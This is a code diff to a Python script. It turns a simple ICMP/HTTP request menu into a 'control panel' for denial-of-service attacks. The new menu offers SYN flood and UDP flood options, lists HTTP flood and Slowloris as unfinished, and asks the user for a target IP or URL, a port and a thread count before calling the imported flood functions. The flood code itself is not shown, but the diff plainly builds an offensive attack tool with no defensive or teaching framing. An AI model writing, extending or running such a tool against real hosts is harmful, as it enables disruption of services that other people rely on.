@@ -1,22 +1,43 @@
-from base import *
+from utils import *
+from syn import *
+from udp import *
 
 def control():
+    RED = "\033[31m"
+    RESET = "\033[0m"
     warning()
 
-    opcao = int(input('''
- CONTROL PANEL !
-_________________
+    opcao = int(input(f'''
+ CONTROL PANEL ! (If you're not a {RED}superuser{RESET}
+                      get out )
+___________________________________________________
                                          
-1 - ICMP REQUEST
-2 - HTTP REQUEST
-_________________
+1 - SYN FLOOD
+2 - UDP FLOOD
+3 - HTTP FLOOD {RED}(Not finished yet){RESET}
+4 - Slowloris Attack {RED}(Not finished yet){RESET}
+___________________________________________________
                                            
-Digite o numero que representa o que quer fazer: ''').strip())
+Choose wisely: ''').strip())
     
     if(opcao == 1):
-        sendICMP()
+        clear()
+        target = input("Target (IP or url) >> ").strip()
+        port = int(input("Target port >> "))
+        num = int(input("Number of threads >> "))
+        synflood(target, port, num)
+
+        clear()
+        results(target, port, num)
     elif(opcao == 2):
-        requestHTTP()
+        clear()
+        target = input("Target (IP or url) >> ").strip()
+        port = int(input("Target port >> "))
+        num = int(input("Number of threads >> "))
+        udpflood(target, port, num)
+
+        clear()
+        results(target, port, num)
 
 control()
     
